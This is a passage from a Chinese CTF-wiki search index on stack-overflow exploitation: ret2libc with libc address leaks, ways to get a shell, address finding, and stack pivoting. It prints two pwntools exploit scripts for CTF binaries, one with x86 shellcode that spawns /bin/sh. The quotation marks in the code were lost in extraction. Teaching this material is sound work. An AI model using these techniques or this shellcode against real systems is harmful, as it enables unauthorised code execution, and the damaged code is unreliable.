system\u51fd\u6570\u5c5e\u4e8elibc\uff0c\u800clibc.so\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u4e4b\u95f4\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\u3002  \u5373\u4f7f\u7a0b\u5e8f\u6709ASLR\u4fdd\u62a4\uff0c\u4e5f\u53ea\u662f\u9488\u5bf9\u4e8e\u5730\u5740\u4e2d\u95f4\u4f4d\u8fdb\u884c\u968f\u673a\uff0c\u6700\u4f4e\u768412\u4f4d\u5e76\u4e0d\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u800clibc\u5728github\u4e0a\u6709\u4eba\u8fdb\u884c\u6536\u96c6\uff0c\u5177\u4f53\u7ec6\u8282\u5982\u4e0b  https://github.com/niklasb/libc-database   \u6240\u4ee5\u5982\u679c\u6211\u4eec\u77e5\u9053libc\u4e2d\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u786e\u5b9a\u8be5\u7a0b\u5e8f\u5229\u7528\u7684libc\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053system\u51fd\u6570\u7684\u5730\u5740\u3002  \u90a3\u4e48\u5982\u4f55\u5f97\u5230libc\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u6211\u4eec\u4e00\u822c\u5e38\u7528\u7684\u65b9\u6cd5\u662f\u91c7\u7528got\u8868\u6cc4\u9732\uff0c\u5373\u8f93\u51fa\u67d0\u4e2a\u51fd\u6570\u5bf9\u5e94\u7684got\u8868\u9879\u7684\u5185\u5bb9\u3002 \u5f53\u7136\uff0c\u7531\u4e8elibc\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u673a\u5236\uff0c\u6211\u4eec\u9700\u8981\u9009\u62e9\u5df2\u7ecf\u6267\u884c\u8fc7\u7684\u51fd\u6570\u6765\u8fdb\u884c\u6cc4\u9732\u3002  \u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u6b65\u9aa4\u5148\u5f97\u5230libc\uff0c\u4e4b\u540e\u5728\u7a0b\u5e8f\u4e2d\u67e5\u8be2\u504f\u79fb\uff0c\u7136\u540e\u518d\u6b21\u83b7\u53d6system\u5730\u5740\uff0c\u4f46\u8fd9\u6837\u624b\u5de5\u64cd\u4f5c\u6b21\u6570\u592a\u591a\uff0c\u6709\u70b9\u9ebb\u70e6\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2alibc\u7684\u5229\u7528\u5de5\u5177\uff0c\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003readme   https://github.com/lieanu/LibcSearcher   \u6b64\u5916\uff0c\u5728\u5f97\u5230libc\u4e4b\u540e\uff0c\u5176\u5b9elibc\u4e2d\u4e5f\u662f\u6709/bin/sh\u5b57\u7b26\u4e32\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4e00\u8d77\u83b7\u5f97/bin/sh\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002  \u8fd9\u91cc\u6211\u4eec\u6cc4\u9732__libc_start_main\u7684\u5730\u5740\uff0c\u8fd9\u662f\u56e0\u4e3a\u5b83\u662f\u7a0b\u5e8f\u6700\u521d\u88ab\u6267\u884c\u7684\u5730\u65b9\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u6cc4\u9732__libc_start_main\u5730\u5740  \u83b7\u53d6libc\u7248\u672c  \u83b7\u53d6system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740  \u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f  \u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884csystem(\u2018/bin/sh\u2019)   exp\u5982\u4e0b  ##!/usr/bin/env python  from   pwn   import   *  from   LibcSearcher   import   LibcSearcher  sh   =   process ( ./ret2libc3 )  ret2libc3   =   ELF ( ./ret2libc3 )  puts_plt   =   ret2libc3 . plt [ puts ]  libc_start_main_got   =   ret2libc3 . got [ __libc_start_main ]  main   =   ret2libc3 . symbols [ main ]  print   leak libc_start_main_got addr and return to main again  payload   =   flat ([ A   *   112 ,   puts_plt ,   main ,   libc_start_main_got ])  sh . sendlineafter ( Can you find it !? ,   payload )  print   get the related addr  libc_start_main_addr   =   u32 ( sh . recv ()[ 0 : 4 ])  libc   =   LibcSearcher ( __libc_start_main ,   libc_start_main_addr )  libcbase   =   libc_start_main_addr   -   libc . dump ( __libc_start_main )  system_addr   =   libcbase   +   libc . dump ( system )  binsh_addr   =   libcbase   +   libc . dump ( str_bin_sh )  print   get shell  payload   =   flat ([ A   *   104 ,   system_addr ,   0xdeadbeef ,   binsh_addr ])  sh . sendline ( payload )  sh . interactive ()", 
            "title": "\u4f8b3"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_12", 
            "text": "train.cs.nctu.edu.tw ret2libc", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#shell", 
            "text": "\u8fd9\u91cc\u603b\u7ed3\u51e0\u79cd\u5e38\u89c1\u7684\u83b7\u53d6shell\u7684\u65b9\u5f0f\uff1a   \u6267\u884cshellcode\uff0c\u8fd9\u4e00\u65b9\u9762\u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u60c5\u51b5  \u53ef\u4ee5\u76f4\u63a5\u8fd4\u56deshell  \u53ef\u4ee5\u5c06shell\u8fd4\u56de\u5230\u67d0\u4e00\u4e2a\u7aef\u53e3  shellcode\u4e2d\u5b57\u7b26\u6709\u65f6\u5019\u9700\u8981\u6ee1\u8db3\u4e0d\u540c\u7684\u9700\u6c42  \u6ce8\u610f\uff0c\u6211\u4eec\u9700\u8981\u5c06shellcode\u5199\u5728\u53ef\u4ee5\u6267\u884c\u7684\u5185\u5b58\u533a\u57df\u4e2d\u3002    \u6267\u884c system(\"/bin/sh\"), system('sh') \u7b49\u7b49  \u5173\u4e8e system \u7684\u5730\u5740\uff0c\u53c2\u89c1\u4e0b\u9762\u7ae0\u8282\u7684 \u5730\u5740\u5bfb\u627e \u3002  \u5173\u4e8e \"/bin/sh\"\uff0c \u201csh\u201d  \u9996\u5148\u5bfb\u627e binary \u91cc\u9762\u6709\u6ca1\u6709\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c \u6bd4\u5982\u8bf4\u6709 flush \u51fd\u6570\uff0c\u90a3\u5c31\u4e00\u5b9a\u6709 sh \u4e86  \u8003\u8651\u4e2a\u4eba\u8bfb\u53d6\u5bf9\u5e94\u5b57\u7b26\u4e32  libc \u4e2d\u5176\u5b9e\u662f\u6709 /bin/sh \u7684    \u4f18\u70b9  \u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u3002    \u7f3a\u70b9  \u6709\u53ef\u80fd\u56e0\u4e3a\u7834\u574f\u73af\u5883\u53d8\u91cf\u800c\u65e0\u6cd5\u6267\u884c\u3002      \u6267\u884c execve(\"/bin/sh\",NULL,NULL)  \u524d\u51e0\u6761\u540c system  \u4f18\u70b9  \u51e0\u4e4e\u4e0d\u53d7\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\u3002    \u7f3a\u70b9  \u9700\u8981 3 \u4e2a\u53c2\u6570\u3002      \u7cfb\u7edf\u8c03\u7528  \u7cfb\u7edf\u8c03\u7528\u53f7 11", 
            "title": "shell\u83b7\u53d6\u5c0f\u7ed3"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_13", 
            "text": "\u5728\u6574\u4e2a\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u603b\u662f\u514d\u4e0d\u4e86\u8981\u53bb\u5bfb\u627e\u4e00\u4e9b\u5730\u5740\uff0c\u5e38\u89c1\u7684\u5bfb\u627e\u5730\u5740\u7684\u7c7b\u578b\uff0c\u6709\u5982\u4e0b\u51e0\u79cd", 
            "title": "\u5730\u5740\u5bfb\u627e\u5c0f\u7ed3"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_14", 
            "text": "", 
            "title": "\u901a\u7528\u5bfb\u627e"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_15", 
            "text": "\u7a0b\u5e8f\u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86\u76f8\u5173\u53d8\u91cf\u6216\u8005\u51fd\u6570\u7684\u5730\u5740\u4e86\u3002\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5229\u7528\u4e86\u3002", 
            "title": "\u76f4\u63a5\u5730\u5740\u5bfb\u627e"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#got", 
            "text": "\u6709\u65f6\u5019\u6211\u4eec\u5e76\u4e0d\u4e00\u5b9a\u975e\u5f97\u76f4\u63a5\u77e5\u9053\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u5229\u7528GOT\u8868\u7684\u8df3\u8f6c\u5230\u5bf9\u5e94\u51fd\u6570\u7684\u5730\u5740\u3002\u5f53\u7136\uff0c\u5982\u679c\u6211\u4eec\u975e\u5f97\u77e5\u9053\u8fd9\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528write\uff0cputs\u7b49\u8f93\u51fa\u51fd\u6570\u5c06GOT\u8868\u4e2d\u5730\u5740\u5904\u5bf9\u5e94\u7684\u5185\u5bb9\u8f93\u51fa\u51fa\u6765\uff08 \u524d\u63d0\u662f\u8fd9\u4e2a\u51fd\u6570\u5df2\u7ecf\u88ab\u89e3\u6790\u4e00\u6b21\u4e86 \uff09\u3002", 
            "title": "got\u8868\u5bfb\u627e"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#libc", 
            "text": "\u76f8\u5bf9\u504f\u79fb\u5bfb\u627e \uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u8003\u8651\u5229\u7528libc\u4e2d\u51fd\u6570\u7684\u57fa\u5730\u5740\u4e00\u6837\u8fd9\u4e2a\u7279\u6027\u6765\u5bfb\u627e\u4e86\u3002\u5176\u5b9e__libc_start_main\u5c31\u662flibc\u5728\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\u3002 \u6ce8\u610f\uff1a\u4e0d\u8981\u9009\u62e9\u6709wapper\u7684\u51fd\u6570\uff0c\u8fd9\u6837\u4f1a\u4f7f\u5f97\u51fd\u6570\u7684\u57fa\u5730\u5740\u8ba1\u7b97\u4e0d\u6b63\u786e\u3002 \u5e38\u89c1\u7684\u6709wapper\u7684\u51fd\u6570\u6709\uff08\u5f85\u8865\u5145\uff09\u3002", 
            "title": "\u6709libc"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#libc_1", 
            "text": "\u5176\u5b9e\uff0c\u8fd9\u79cd\u60c5\u51b5\u7684\u89e3\u51b3\u7b56\u7565\u5206\u4e3a\u4e24\u79cd   \u60f3\u529e\u6cd5\u83b7\u53d6libc  \u60f3\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u5730\u5740\u3002   \u800c\u5bf9\u4e8e\u60f3\u8981\u6cc4\u9732\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ea\u662f\u5355\u7eaf\u5730\u9700\u8981\u5176\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u6240\u4ee5puts\u548cwrite\u5747\u53ef\u4ee5\u3002   puts\u4f1a\u6709\\x00\u622a\u65ad\u7684\u95ee\u9898  write\u53ef\u4ee5\u6307\u5b9a\u957f\u5ea6\u8f93\u51fa\u7684\u5185\u5bb9\u3002   \u4e0b\u9762\u662f\u4e00\u4e9b\u76f8\u5e94\u7684\u65b9\u6cd5", 
            "title": "\u65e0libc"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#dynelf", 
            "text": "\u524d\u63d0\u662f\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732\u4efb\u610f\u5730\u5740\u7684\u5185\u5bb9\u3002   \u5982\u679c\u8981\u4f7f\u7528write\u51fd\u6570\u6cc4\u9732\u7684\u8bdd\uff0c\u4e00\u6b21\u6700\u597d\u591a\u8f93\u51fa\u4e00\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u822c\u662f\u53ea\u662f\u4e0d\u65ad\u5730\u5411\u9ad8\u5730\u5740\u8bfb\u5185\u5bb9\uff0c\u5f88\u6709\u53ef\u80fd\u5bfc\u81f4\u9ad8\u5730\u5740\u7684\u73af\u5883\u53d8\u91cf\u88ab\u8986\u76d6\uff0c\u5c31\u4f1a\u5bfc\u81f4shell\u4e0d\u80fd\u542f\u52a8\u3002", 
            "title": "DynELF"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#libc_2", 
            "text": "## \u66f4\u65b0\u6570\u636e\u5e93 \n./get ## \u5c06\u5df2\u6709libc\u6dfb\u52a0\u5230\u6570\u636e\u5e93\u4e2d \n./add libc.so  ## Find all the libc s in the database that have the given names at the given addresses.  \n./find function1 addr function2 addr ## Dump some useful offsets, given a libc ID. You can also provide your own names to dump. \n./Dump some useful offsets  \u53bblibc\u7684\u6570\u636e\u5e93\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u548c\u5df2\u7ecf\u51fa\u73b0\u7684\u5730\u5740\u4e00\u6837\u7684libc\uff0c\u8fd9\u65f6\u5019\u5f88\u6709\u53ef\u80fd\u662f\u4e00\u6837\u7684\u3002   libcdb.com   \u5f53\u7136\uff0c\u8fd8\u6709\u4e0a\u9762\u63d0\u5230\u7684https://github.com/lieanu/LibcSearcher\u3002", 
            "title": "libc\u6570\u636e\u5e93"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#ret2dl-resolve", 
            "text": "\u5f53ELF\u6587\u4ef6\u91c7\u7528\u52a8\u6001\u94fe\u63a5\u65f6\uff0cgot\u8868\u4f1a\u91c7\u7528\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\u3002\u5f53\u7b2c\u4e00\u6b21\u8c03\u7528\u67d0\u4e2alibc\u51fd\u6570\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8c03\u7528_dl_runtime_resolve\u51fd\u6570\u5bf9\u5176\u5730\u5740\u89e3\u6790\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020ROP\u94fe\uff0c\u4f2a\u9020\u5bf9\u5176\u4ed6\u51fd\u6570\uff08\u5982\uff1asystem\uff09\u7684\u89e3\u6790\u3002\u8fd9\u4e5f\u662f\u6211\u4eec\u5728\u9ad8\u7ea7rop\u4e2d\u4f1a\u4ecb\u7ecd\u7684\u6280\u5de7\u3002", 
            "title": "ret2dl-resolve"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_16", 
            "text": "train.cs.nctu.edu.tw  rop  2013-PlaidCTF-ropasaurusrex  Defcon 2015 Qualifier: R0pbaby   \u53c2\u8003\u9605\u8bfb   \u4e4c\u4e91\u4e00\u6b65\u4e00\u6b65ROP\u7bc7(\u84b8\u7c73)  \u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0a\uff09  \u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0b\uff09   \u3010\u6280\u672f\u5206\u4eab\u3011\u73b0\u4ee3\u6808\u6ea2\u51fa\u5229\u7528\u6280\u672f\u57fa\u7840\uff1aROP", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/others/", 
            "text": "\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7\n\n\nstack privot\n\n\n\u539f\u7406\n\n\nstack privot\uff0c\u6b63\u5982\u5b83\u6240\u63cf\u8ff0\u7684\uff0c\u8be5\u6280\u5de7\u5c31\u662f\u52ab\u6301\u6808\u6307\u9488\u6307\u5411\u653b\u51fb\u8005\u6240\u80fd\u63a7\u5236\u7684\u5185\u5b58\u5904\uff0c\u7136\u540e\u518d\u5728\u76f8\u5e94\u7684\u4f4d\u7f6e\u8fdb\u884cROP\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5728\u4ee5\u4e0b\u60c5\u51b5\u9700\u8981\u4f7f\u7528stack privot\n\n\n\n\n\u53ef\u4ee5\u63a7\u5236\u7684\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u6570\u8f83\u5c11\uff0c\u96be\u4ee5\u6784\u9020\u8f83\u957f\u7684ROP\u94fe\n\n\n\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u6808\u5730\u5740\u672a\u77e5\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6808\u52ab\u6301\u5230\u5df2\u77e5\u7684\u533a\u57df\u3002\n\n\n\u5176\u5b83\u6f0f\u6d1e\u96be\u4ee5\u5229\u7528\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8f6c\u6362\uff0c\u6bd4\u5982\u8bf4\u5c06\u6808\u52ab\u6301\u5230\u5806\u7a7a\u95f4\uff0c\u4ece\u800c\u5229\u7528\u5806\u6f0f\u6d1e\n\n\n\n\n\u6b64\u5916\uff0c\u5229\u7528stack privot\u6709\u4ee5\u4e0b\u51e0\u4e2a\u8981\u6c42\n\n\n\n\n\n\n\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002\n\n\n\n\n\n\n\u53ef\u4ee5\u63a7\u5236sp\u6307\u9488\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u63a7\u5236\u6808\u6307\u9488\u4f1a\u4f7f\u7528ROP\uff0c\u5e38\u89c1\u7684\u63a7\u5236\u6808\u6307\u9488\u7684gadgets\u4e00\u822c\u662f\n\n\n\n\n\n\npop\n \nrsp\n/\nesp\n\n\n\n\n\n\u5f53\u7136\uff0c\u8fd8\u4f1a\u6709\u4e00\u4e9b\u5176\u5b83\u7684\u59ff\u52bf\u3002\u6bd4\u5982\u8bf4libc_csu_init\u4e2d\u7684gadgets\uff0c\u6211\u4eec\u901a\u8fc7\u504f\u79fb\u5c31\u53ef\u4ee5\u5f97\u5230\u63a7\u5236rsp\u6307\u9488\u3002\u4e0a\u9762\u7684\u662f\u6b63\u5e38\u7684\uff0c\u4e0b\u9762\u7684\u662f\u504f\u79fb\u7684\u3002\n\n\ngef\n\u27a4\n  \nx\n/\n7\ni\n \n0x000000000040061a\n\n\n0\nx40061a\n \n__libc_csu_init\n+\n90\n:\n  \npop\n    \nrbx\n\n\n0\nx40061b\n \n__libc_csu_init\n+\n91\n:\n  \npop\n    \nrbp\n\n\n0\nx40061c\n \n__libc_csu_init\n+\n92\n:\n  \npop\n    \nr12\n\n\n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n  \npop\n    \nr13\n\n\n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n  \npop\n    \nr14\n\n\n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n  \npop\n    \nr15\n\n\n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n \nret\n    \n\ngef\n\u27a4\n  \nx\n/\n7\ni\n \n0x000000000040061d\n\n\n0\nx40061d\n \n__libc_csu_init\n+\n93\n:\n  \npop\n    \nrsp\n\n\n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n  \npop\n    \nr13\n\n\n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n  \npop\n    \nr14\n\n\n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n  \npop\n    \nr15\n\n\n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n \nret\n\n\n\n\n\n\u6b64\u5916\uff0c\u8fd8\u6709\u66f4\u52a0\u9ad8\u7ea7\u7684fake frame\u3002\n\n\n\n\n\u5b58\u5728\u53ef\u4ee5\u63a7\u5236\u5185\u5bb9\u7684\u5185\u5b58\uff0c\u4e00\u822c\u6709\u5982\u4e0b\n\n\nbss\u6bb5\u3002\u7531\u4e8e\u8fdb\u7a0b\u6309\u9875\u5206\u914d\u5185\u5b58\uff0c\u5206\u914d\u7ed9bss\u6bb5\u7684\u5185\u5b58\u5927\u5c0f\u81f3\u5c11\u4e00\u4e2a\u9875(4k,0x1000)\u5927\u5c0f\u3002\u7136\u800c\u4e00\u822cbss\u6bb5\u7684\u5185\u5bb9\u7528\u4e0d\u4e86\u8fd9\u4e48\u591a\u7684\u7a7a\u95f4\uff0c\u5e76\u4e14bss\u6bb5\u5206\u914d\u7684\u5185\u5b58\u9875\u62e5\u6709\u8bfb\u5199\u6743\u9650\u3002\n\n\nheap\u3002\u4f46\u662f\u8fd9\u4e2a\u9700\u8981\u6211\u4eec\u80fd\u591f\u6cc4\u9732\u5806\u5730\u5740\u3002\n\n\n\n\n\u793a\u4f8b\n\n\n\u4f8b1\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5\nX-CTF Quals 2016 - b0verfl0w\n\u4e3a\u4f8b\uff0c\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u67e5\u770b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4\uff0c\u5982\u4e0b\n\n\n\u279c  X-CTF Quals \n2016\n - b0verfl0w git:\n(\niromise\n)\n \u2717 checksec b0verfl0w                 \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n    RWX:      Has RWX segments\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u4e5f\u6ca1\u6709\u5f00\u542fNX\u4fdd\u62a4\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u627e\u4e00\u4e0b\u7a0b\u5e8f\u7684\u6f0f\u6d1e\n\n\nsigned\n \nint\n \nvul\n()\n\n\n{\n\n  \nchar\n \ns\n;\n \n// [sp+18h] [bp-20h]@1\n\n\n  \nputs\n(\n\\n\n======================\n);\n\n  \nputs\n(\n\\n\nWelcome to X-CTF 2016!\n);\n\n  \nputs\n(\n\\n\n======================\n);\n\n  \nputs\n(\nWhat\ns your name?\n);\n\n  \nfflush\n(\nstdout\n);\n\n  \nfgets\n(\ns\n,\n \n50\n,\n \nstdin\n);\n\n  \nprintf\n(\nHello %s.\n,\n \ns\n);\n\n  \nfflush\n(\nstdout\n);\n\n  \nreturn\n \n1\n;\n\n\n}\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u4f46\u662f\u5176\u6240\u80fd\u6ea2\u51fa\u7684\u5b57\u8282\u5c31\u53ea\u670950-0x20-4=14\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u6267\u884c\u4e00\u4e9b\u6bd4\u8f83\u597d\u7684ROP\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u8003\u8651stack privot\u3002\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u5e76\u6ca1\u6709\u5f00\u542f\u5806\u6808\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728\u6808\u4e0a\u5e03\u7f6eshellcode\u5e76\u6267\u884c\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528\u6808\u6ea2\u51fa\u5e03\u7f6eshellcode\n\n\n\u63a7\u5236eip\u6307\u5411shellcode\u5904\n\n\n\n\n\u7b2c\u4e00\u6b65\uff0c\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u5730\uff0c\u76f4\u63a5\u8bfb\u53d6\u5373\u53ef\uff0c\u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u4f1a\u5f00\u542fASLR\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u76f4\u63a5\u77e5\u9053shellcode\u7684\u5730\u5740\u3002\u4f46\u662f\u6808\u4e0a\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u5bf9esp\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f7f\u5176\u6307\u5411shellcode\u5904\uff0c\u5e76\u4e14\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u81f3esp\u5904\u3002\u90a3\u4e0b\u9762\u5c31\u662f\u627e\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u5230esp\u5904\u7684gadgets\u4e86\u3002\n\n\n\u279c  X-CTF Quals \n2016\n - b0verfl0w git:\n(\niromise\n)\n \u2717 ROPgadget --binary b0verfl0w --only \njmp|ret\n         \nGadgets \ninformation\n\n\n============================================================\n\n0x08048504 : jmp esp\n0x0804836a : ret\n0x0804847e : ret 0xeac1\n\nUnique gadgets found: \n3\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u53d1\u73b0\u6709\u4e00\u4e2a\u53ef\u4ee5\u76f4\u63a5\u8df3\u8f6c\u5230esp\u7684gadgets\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5e03\u7f6epayload\u5982\u4e0b\n\n\nshellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp\n\n\n\n\n\u90a3\u4e48\u6211\u4eecpayload\u4e2d\u7684\u6700\u540e\u4e00\u90e8\u5206\u6539\u5982\u4f55\u8bbe\u7f6eesp\u5462\uff0c\u53ef\u4ee5\u77e5\u9053\n\n\n\n\nsize(shellcode+padding)=0x20\n\n\nsize(fake ebp)=0x4\n\n\nsize(0x08048504)=0x4\n\n\n\n\n\u6240\u4ee5\u6211\u4eec\u6700\u540e\u4e00\u6bb5\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u5c31\u662f\n\n\nsub\n \n0x28\n,\nesp\n\n\njmp\n \nesp\n\n\n\n\n\n\u6240\u4ee5\u6700\u540e\u7684exp\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nsh\n \n=\n \nprocess\n(\n./b0verfl0w\n)\n\n\n\nshellcode_x86\n \n=\n \n\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\n\n\nshellcode_x86\n \n+=\n \n\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\n\n\nshellcode_x86\n \n+=\n \n\\x0b\\xcd\\x80\n\n\n\nsub_esp_jmp\n \n=\n \nasm\n(\nsub esp, 0x28;jmp esp\n)\n\n\njmp_esp\n \n=\n \n0x08048504\n\n\npayload\n \n=\n \nshellcode_x86\n \n+\n \n(\n\n    \n0x20\n \n-\n \nlen\n(\nshellcode_x86\n))\n \n*\n \nb\n \n+\n \nbbbb\n \n+\n \np32\n(\njmp_esp\n)\n \n+\n \nsub_esp_jmp\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u4f8b2-\u8f6c\u79fb\u5806\n\n\n\u5f85\u3002\n\n\n\u9898\u76ee\n\n\n\n\nEkoPartyCTF 2016 fuckzing-exploit-200\n\n\n\n\nframe faking\n\n\n\u6b63\u5982\u8fd9\u4e2a\u6280\u5de7\u540d\u5b57\u6240\u8bf4\u7684\u90a3\u6837\uff0c\u8fd9\u4e2a\u6280\u5de7\u5c31\u662f\u6784\u9020\u4e00\u4e2a\u865a\u5047\u7684\u6808\u5e27\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\n\n\n\u539f\u7406\n\n\n\u6982\u62ec\u5730\u8bb2\uff0c\u6211\u4eec\u5728\u4e4b\u524d\u8bb2\u7684\u6808\u6ea2\u51fa\u4e0d\u5916\u4e4e\u4e24\u79cd\u65b9\u5f0f\n\n\n\n\n\u63a7\u5236\u7a0b\u5e8fEIP\n\n\n\u63a7\u5236\u7a0b\u5e8fEBP\n\n\n\n\n\u5176\u6700\u7ec8\u90fd\u662f\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u5728frame faking\u4e2d\uff0c\u6211\u4eec\u6240\u5229\u7528\u7684\u6280\u5de7\u4fbf\u662f\u540c\u65f6\u63a7\u5236EBP\u4e0eEIP\uff0c\u8fd9\u6837\u6211\u4eec\u5728\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7684\u540c\u65f6\uff0c\u4e5f\u6539\u53d8\u7a0b\u5e8f\u6808\u5e27\u7684\u4f4d\u7f6e\u3002\u4e00\u822c\u6765\u8bf4\u5176payload\u5982\u4e0b\n\n\nbuffer padding|fake ebp|leave ret addr|\n\n\n\n\n\u5373\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u5c06\u6808\u4e0a\u6784\u9020\u4e3a\u5982\u4e0a\u683c\u5f0f\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u63a5\u4e0b\u540e\u9762\u4e24\u4e2a\u90e8\u5206\n\n\n\n\n\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u88ab\u6211\u4eec\u8986\u76d6\u4e3a\u6267\u884cleave 